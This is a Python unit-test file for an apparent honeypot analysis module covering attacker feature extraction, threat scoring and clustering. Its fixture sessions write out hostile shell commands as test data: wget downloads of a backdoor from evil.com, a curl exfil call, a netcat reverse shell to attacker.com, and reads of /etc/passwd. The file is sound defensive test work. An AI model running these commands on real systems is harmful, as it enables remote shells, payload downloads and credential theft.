"""
Tests for the AI Module (Feature Extraction, Clustering, Threat Scoring).
"""

import os
import sys
import unittest

import numpy as np

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'ai-module'))

from app.feature_extractor import AttackerFeatureExtractor
from app.threat_scorer import ThreatScorer
from app.clustering import AttackerClusterer


class TestFeatureExtractor(unittest.TestCase):
    """Test the feature extraction from session data."""

    def setUp(self):
        self.extractor = AttackerFeatureExtractor()

    def test_empty_session(self):
        """Empty session should return zero vector."""
        features = self.extractor.extract({})
        self.assertEqual(features.shape, (15,))
        self.assertTrue(np.all(features == 0.0))

    def test_full_session(self):
        """Full session should produce non-zero features."""
        session = {
            "duration_seconds": 300,
            "commands": [
                {"command": "ls -la", "timestamp": "2024-11-15T10:30:00Z"},
                {"command": "cat /etc/passwd", "timestamp": "2024-11-15T10:30:05Z"},
                {"command": "wget http://evil.com/payload", "timestamp": "2024-11-15T10:30:10Z"},
                {"command": "ssh admin@10.0.1.50", "timestamp": "2024-11-15T10:30:15Z"},
            ],
            "credentials_tried": [
                {"username": "admin", "password": "admin"},
                {"username": "root", "password": "root"},
                {"username": "admin", "password": "password"},
            ],
            "files_accessed": [
                {"path": "/etc/passwd", "found": True},
                {"path": "/home/admin/credentials.txt", "found": True},
            ],
            "download_attempts": [
                {"url": "http://evil.com/payload"},
            ],
        }
        features = self.extractor.extract(session)
        self.assertEqual(features.shape, (15,))
        self.assertEqual(features[0], 300)  # duration
        self.assertEqual(features[1], 4)    # total commands
        self.assertGreater(features[3], 0)  # recon ratio (ls, cat)
        self.assertGreater(features[4], 0)  # exploit ratio (wget)
        self.assertEqual(features[9], 3)    # total credentials
        self.assertEqual(features[12], 2)   # files accessed
        self.assertEqual(features[14], 1)   # download attempts

    def test_feature_names(self):
        """Feature names should match the expected count."""
        self.assertEqual(len(AttackerFeatureExtractor.FEATURE_NAMES), 15)

    def test_extract_with_names(self):
        """Named extraction should return dict with all keys."""
        result = self.extractor.extract_with_names({"duration_seconds": 100})
        self.assertIsInstance(result, dict)
        self.assertEqual(len(result), 15)
        self.assertEqual(result["session_duration"], 100)


class TestThreatScorer(unittest.TestCase):
    """Test the threat scoring system."""

    def setUp(self):
        self.scorer = ThreatScorer()

    def test_empty_session_low_score(self):
        """Empty session should have low threat score."""
        result = self.scorer.score({})
        self.assertLessEqual(result["threat_score"], 25)
        self.assertEqual(result["severity"], "low")

    def test_dangerous_commands_increase_score(self):
        """Sessions with dangerous commands should have higher scores."""
        session = {
            "commands": [
                {"command": "wget http://evil.com/backdoor.sh"},
                {"command": "curl http://evil.com/exfil"},
                {"command": "chmod +x backdoor.sh"},
                {"command": "nc -e /bin/sh attacker.com 4444"},
                {"command": "python -c 'import socket'"},
            ],
        }
        result = self.scorer.score(session)
        self.assertGreaterEqual(result["threat_score"], 25)
        self.assertIn("dangerous_commands", result["breakdown"])

    def test_max_score_cap(self):
        """Score should never exceed 100."""
        session = {
            "duration_seconds": 7200,
            "commands": [
                {"command": cmd} for cmd in [
                    "wget", "curl", "nc", "python", "gcc",
                    "chmod", "ssh", "scp", "nmap", "tar",
                    "zip", "base64", "perl", "ruby",
                ]
            ],
            "credentials_tried": [{"username": f"u{i}", "password": f"p{i}"} for i in range(30)],
            "files_accessed": [{"path": f"/etc/{k}"} for k in ["passwd", "shadow", ".env", "config", "key"]],
        }
        result = self.scorer.score(session)
        self.assertLessEqual(result["threat_score"], 100)

    def test_severity_levels(self):
        """Test all severity thresholds."""
        # Critical
        result = self.scorer.score({
            "duration_seconds": 700,
            "commands": [{"command": c} for c in ["wget", "curl", "nc", "python", "gcc"]],
            "credentials_tried": [{"username": f"u{i}", "password": f"p{i}"} for i in range(25)],
            "files_accessed": [{"path": f"/{k}"} for k in ["passwd", "shadow", ".env", "config"]],
        })
        self.assertIn(result["severity"], ["critical", "high"])


class TestClustering(unittest.TestCase):
    """Test the clustering module."""

    def test_initial_state(self):
        """Clusterer should start untrained."""
        clusterer = AttackerClusterer()
        # It might load pre-existing models, but if not:
        status = clusterer.get_cluster_stats()
        self.assertEqual(status["n_clusters"], 5)

    def test_predict_untrained(self):
        """Prediction should fail gracefully when untrained."""
        clusterer = AttackerClusterer()
        if not clusterer.is_trained:
            result = clusterer.predict({"commands": []})
            self.assertEqual(result["status"], "not_trained")

    def test_training_insufficient_data(self):
        """Training with too few sessions should return error."""
        clusterer = AttackerClusterer()
        result = clusterer.train([{"commands": []}])
        self.assertEqual(result["status"], "error")


if __name__ == "__main__":
    unittest.main()
